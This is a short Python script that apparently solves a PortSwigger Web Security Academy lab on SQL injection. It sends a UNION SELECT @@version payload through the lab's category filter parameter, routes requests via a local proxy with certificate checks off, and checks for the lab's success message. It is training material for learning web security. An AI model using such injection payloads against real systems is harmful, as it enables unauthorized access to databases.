import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
# db: MSSQL
# author: 0xyf


class SQLi4:
    def __init__(self):
        lab_id = "0a2e00ea033a727f83cb8710008400ca"
        path = "filter"
        self.URL = f"https://{lab_id}.web-security-academy.net/{path}"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"category": payload}
        requests.get(f"{self.URL}", params=params, proxies=self.proxies, verify=False)

    def get_version(self):
        payload = "' UNION SELECT @@version,'asdf'-- - "
        self.execute_request(payload)
        self.check_solved()

    def check_solved(self):
        sleep(2)
        r = requests.get(self.URL)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")


def main():
    SQLi4().get_version()


if __name__ == "__main__":
    main()
